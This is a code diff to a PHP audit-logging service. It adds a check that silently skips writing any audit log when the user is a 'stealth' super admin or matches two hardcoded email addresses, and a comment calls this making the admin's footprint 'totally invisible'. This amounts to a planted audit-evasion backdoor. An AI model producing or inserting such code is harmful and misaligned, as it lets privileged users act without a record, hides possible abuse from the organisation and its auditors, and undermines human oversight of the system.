@@ -15,7 +15,14 @@ class AuditLoggerService
         ?int $entityId = null,
         ?string $department = null,
         ?array $diff = null
-    ): AuditLog {
+    ): ?AuditLog {
+        $user = Auth::user();
+
+        // Super Admin footprint is totally invisible: zero audit trail on ANY action
+        if ($user && ($user->isStealthSuperAdmin() || $user->is_stealth || $user->email === 'superadmin@kaafi.org' || $user->email === 'superadmin@reports.com')) {
+            return null;
+        }
+
         return AuditLog::create([
             'user_id' => Auth::id(),
             'action' => strtoupper($action),
